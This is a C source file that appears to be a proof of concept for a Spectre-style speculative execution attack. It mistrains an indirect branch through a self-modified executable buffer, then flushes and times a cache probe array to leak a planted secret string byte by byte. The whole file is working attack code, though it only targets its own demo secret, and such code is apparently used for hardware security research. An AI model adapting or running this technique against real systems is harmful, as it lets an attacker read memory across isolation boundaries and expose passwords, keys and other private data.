#define _GNU_SOURCE
#include <emmintrin.h>
#include <stddef.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>

#include "../cache.h"

/// The buf_size is used in the victim function so it has to be a variable and
/// not a constant. So it can be evicted from the cache and won't be hardcoded
/// in asm
size_t victim_buf_size CACHE_LINE_ALIGNED = 16;
char victim_buf[16] CACHE_LINE_ALIGNED = {1, 2,  3,  4,  5,  6,  7,  8,
                                          9, 10, 11, 12, 13, 14, 15, 16};
char probe[256 * CACHE_LINE_SIZE] CACHE_LINE_ALIGNED;
char *secret = "The answer is 42";

#define NUM_TRAINING 6
#define NUM_ROUNDS 1
#define SAME_INDEX_ROUNDS 10

/// The gadget function is used to mistrain the target of the indirect call
/* size_t gadget(char *addr) { return probe[*addr * CACHE_LINE_SIZE]; } */
size_t (*gadget)(size_t);

size_t noinline malicious_target(size_t val) {
  return probe[victim_buf[val] * CACHE_LINE_SIZE];
}

int noinline safe_target() { return 42; }

void victim_function(size_t idx) {
  memmove(gadget, &malicious_target, 0x50);
  _mm_mfence();
  gadget(idx);
}

void placeholder_function(size_t idx) {
  memmove(gadget, &safe_target, 0x50);
  _mm_mfence();
  gadget(idx);
}

void noinline victim(size_t addr, size_t idx) {
  size_t target_addr = addr - 2;

  size_t t1 = 2;
  size_t t2 = t1 << 4;
  double fa4 = (double)t1;
  double fa5 = (double)t2;

  fa5 /= fa4;
  fa5 /= fa4;
  fa5 /= fa4;
  fa5 /= fa4;

  t2 = (size_t)fa5;
  target_addr = target_addr + t2;

  ((void (*)(size_t))target_addr)(idx);
}

size_t sbsc(size_t x_to_read) {
  size_t results[256] = {0};
  size_t placeholder_addr = (size_t)&placeholder_function;
  size_t victim_addr = (size_t)&victim_function;

  for (size_t try = 999; try > 0; try--) {
    /// Flush the probe array from the cache
    for (size_t i = 0; i < 256; i++) {
      _mm_clflush(&probe[i * CACHE_LINE_SIZE]);
    }

    size_t t_addr, t_idx;
    size_t train_x = try % victim_buf_size;
    for (int i = NUM_TRAINING; i >= 0; i--) {
      poors_man_mfence();

      t_addr = ((i % (NUM_TRAINING + 1)) - 1) & ~0xFFFF;
      t_addr = (t_addr | (t_addr >> 16));
      t_addr = victim_addr ^ (t_addr & (placeholder_addr ^ victim_addr));

      t_idx = ((i % (NUM_TRAINING + 1)) - 1) & ~0xFFFF;
      t_idx = (t_idx | (t_idx >> 16));
      t_idx = x_to_read ^ (t_idx & (x_to_read ^ train_x));

      victim(t_addr, t_idx);
    }

    measure_cache(probe, results);
    int read = valid_read(results, 256);
    if (read != -1) {
      return read;
    }
  }

  return 0;
}

int main(int argc, char *argv[]) {
  pin_cpu0();

  ptrdiff_t secret_offset = secret - (char *)victim_buf;
  int len = strlen(secret);

  gadget = mmap(NULL, 0x51, PROT_READ | PROT_WRITE | PROT_EXEC,
                MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
  memmove(gadget, &safe_target, 0x51);

  _mm_mfence();

  /// Write probe to RAM and put it in non COW pages
  for (int i = 0; i < sizeof(probe); i++) {
    probe[i] = 1;
  }

  for (int i = 0; i < len; i++) {
    printf("reading %d...", i);
    char value = sbsc(secret_offset + i);
    printf("0x%02X='%c'\n", value, (value > 31 && value < 127 ? value : '?'));
  }
  printf("\n");
  return 0;
}
